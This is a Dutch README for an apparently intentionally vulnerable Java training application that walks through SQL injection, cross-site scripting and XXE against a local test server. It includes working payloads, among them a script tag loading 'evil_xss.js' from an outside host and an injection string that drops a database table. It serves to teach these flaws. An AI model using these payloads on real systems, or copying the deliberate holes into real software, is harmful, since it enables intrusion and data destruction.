# OwaspVulnerabilities

In deze applicatie zijn drie vulnerabilities ingebouwd.<br>

Injection (sql en code)<br>
Cross site scripting XSS<br>
XML External Entity (XXE) Processing<br>

Injection (sql en code)<br>
Na het starten van de applicatie is er een H2 database met url: http://localhost:9080/h2-console/<br>
User is sa, password is leeg.<br>

Tabellen User en Article<br>
User wordt gebruikt om 'in te loggen' - SQL injectie<br>
Article wordt gebruikt om code te injecteren.<br>

Testen gaat via Swagger (http://localhost:9080/swagger-ui.html#/) en browser. Er is geen frontend.<br>

Code injectie <br>

Voeg middels 'addArticle' van de ArticleController een article toe met in het veld description: <br>
<code><script>alert('Hello')</script><code>
(id mag leeg blijven)
In de response is het aangemaakte article te zien met het id.
Gebruik dit id in 'getArticleById' om het article op te halen.
Er gebeurt verder niets maar de code is te zien in de response.
Kopieer de 'Request url' onder het Curl stukje (bijv. http://localhost:9080/api/article/getArticleById?id=2).
Gebruik de url in de browser.
Er is nu een alert melding te zien.
Voek een nieuwe article toe met in het veld description:
<script src='http://home.kpn.nl/vuwu57lx/evil_xss.js'></script>
Gebruik van de url van dit nieuwe article (bijv. http://localhost:9080/api/article/getArticleById?id=3)
geeft nu een melding in de browser m.b.t. encrypted files

---------------------------------------------------------------------------------------------------------
SQL injectie

De methode authenticate van de AuthenticationController wordt gebruikt om in te loggen.
Bij verkeerde credentials wordt status 401 teruggegeven en een leeg user object.
Bij de juiste credentials wordt een gevuld user object teruggegeven
user nikki@info.org
pw   S&cr#t
In de logging is de gebruikte sql query te zien:
SELECT * FROM User WHERE user = 'nikki@info.org' and password = 'S&cr#t'
Het is nu de kunst om iets in het password in te vullen zodat een geldige query ontstaat die resultaat oplevert.
Een voorbeeld is: ' or '1' = '1
De query wordt dan:
SELECT * FROM User WHERE user = 'nikki@info.org' and password = '' or '1' = '1'
Dit: ' or '1' = '1'   ; drop table article; --
geeft query 
SELECT * FROM User WHERE user = 'nikki@info.org' and password = '' or '1' = '1'   ; drop table article; --'
en heeft tot gevolg dat tabel article is verwijderd.

---------------------------------------------------------------------------------------------------------
XML External Entity (XXE) Processing

In een XML bestand is het mogelijk om een DOCTYPE element op te nemen.
Hierin kunnen uitvoerbare instructies staan
XML parsers voeren deze instructies uit, afhankelijk van bepaalde settings.

De RegisterXxeAttackController logt een dergelijke 'aanval'.
Upload in Swagger via de XmlUploadController bestand ...src/main/resources/aanvraag.xml
Het gevulde object wordt getoond in de response.
Doe hetzelfde met ...src/main/resources/xxeaanvraag.xml
In de logging is nu te zien:
RegisterXxeAttackController      : Http request in !DOCTYPE element in xml is executed!


N.B.
In de pom staan dependencies voor jaxb omdat deze geen deel meer uitmaken van Java versies > 8
Het kan zijn dat hier, afhankelijk van de gebruikte Java versie, problemen mee ontstaan.




